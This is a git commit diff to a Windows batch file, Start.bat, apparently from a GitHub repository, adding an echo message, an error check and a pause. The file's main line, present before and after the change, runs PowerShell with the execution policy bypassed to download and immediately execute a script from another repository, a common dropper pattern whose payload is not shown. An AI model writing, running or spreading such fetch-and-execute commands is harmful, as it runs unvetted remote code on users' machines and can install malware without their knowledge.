d60ddd22b6fd0d869134891dbf82b672107a49f5
zrxqzrxq123 <144971724+zrxqzrxq123@users.noreply.github.com>
2026-01-24 12:06:57 -0600

    Update Start.bat

--- Start.bat
+++ Start.bat
@@ -1,2 +1,5 @@
 @echo off
+echo Attempting to run PowerShell script from GitHub...
 powershell -ExecutionPolicy Bypass -Command "iex (irm https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)"
+if %errorlevel% neq 0 echo There was an error running the script.
+pause
